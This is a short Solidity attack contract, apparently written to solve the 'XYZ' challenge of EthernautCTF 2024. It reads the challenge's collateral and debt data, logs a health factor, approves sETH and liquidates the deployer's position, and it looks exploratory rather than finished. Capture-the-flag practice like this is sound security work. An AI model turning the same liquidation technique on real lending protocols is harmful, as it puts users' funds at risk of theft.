// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "src/EthernautCTF_2024/XYZ/Challenge.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/console2.sol";


contract XYZAttack {
    Challenge public challenge;
    address public deployer;
    Manager public manager;
    Token public xyz;
    Token public sETH;
    Manager.Collateral public c;
    PriceFeed public priceFeed;
    ERC20Signal public protocolDebtToken;
    ERC20Signal public protocolCollateralToken;

    constructor(Challenge _challenge, address _deployer) payable {
        challenge = _challenge;
        deployer = _deployer;
        manager = challenge.manager();
        xyz = challenge.xyz();
        sETH = challenge.seth();
        (protocolCollateralToken, protocolDebtToken, priceFeed, , ) = manager.collateralData(sETH);
    }


    function solve() public {
        console2.log(xyz.totalSupply());
        (uint price, ) = priceFeed.fetchPrice();
        console2.log(ProtocolMath._computeHealth(protocolCollateralToken.balanceOf(deployer), protocolDebtToken.balanceOf(deployer), price));
        // console2.log(130 * 10**18 / 100);
        sETH.approve(address(manager), type(uint256).max);
        manager.liquidate(deployer);
    }


}